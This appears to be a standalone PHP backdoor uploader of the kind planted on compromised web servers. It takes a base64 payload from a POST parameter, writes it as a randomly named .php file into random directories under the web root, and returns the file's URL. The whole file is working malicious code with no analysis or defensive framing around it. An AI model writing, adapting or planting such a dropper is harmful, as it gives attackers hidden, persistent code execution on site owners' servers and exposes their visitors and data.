<?php
function GetRoot()
{
    $root_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($root_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($root_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $root_end);
    }
}

function GenerateFilename()
{
    $length = rand(5,12);

    $cahrs = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $cahrsLen = strlen($cahrs);

    $randomString = '';

    for ($i = 0; $i < $length; $i++)
    {
        $randomString .= $cahrs[rand(0, $cahrsLen - 1)];
    }
    return $randomString . ".php";
}

function GetDirs($dir)
{
    $result = array();
    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $result[] = $current_dir;

                $result = array_merge($result, GetDirs($current_dir));
            }
        }
    }

    closedir($h);

    return $result;
}

if (!function_exists('file_put_contents')) 
{
    function file_put_contents($filename, $data) 
    {
        $f = @fopen($filename, 'w');
        if (!$f) 
        {
            return false;
        } 
        else 
        {
            $bytes = fwrite($f, $data);
            fclose($f);
            return $bytes;
        }
    }
}


if ($_POST['u'])
{
    $upload_data = base64_decode($_POST['u']);
}
else
{
    exit();
}

$root_dir = GetRoot();
$dirs = GetDirs($root_dir);

if (count($dirs) == 0)
{
    echo "NO_DIR";
    exit();
}

srand(time());

shuffle($dirs);

$tries = 10;

$result = "ERROR";

foreach ($dirs as $dir)
{
    if ($tries <= 0)
    {
        break;
    }
    else
    {
        $tries--;
    }

    $path_upload_file = $dir . "/" . GenerateFilename();


    if (file_put_contents($path_upload_file, $upload_data))
    {
        $pos = strpos($path_upload_file, $root_dir);

        $uri_path = substr($path_upload_file, $pos + strlen($root_dir));

        $full_uri = @$_SERVER['HTTP_HOST'] . (strpos($uri_path, "/") == 0 ? $uri_path : "/".$uri_path);

        $result = "upload::http://" . $full_uri;

        break;
    }

}

echo $result;

exit();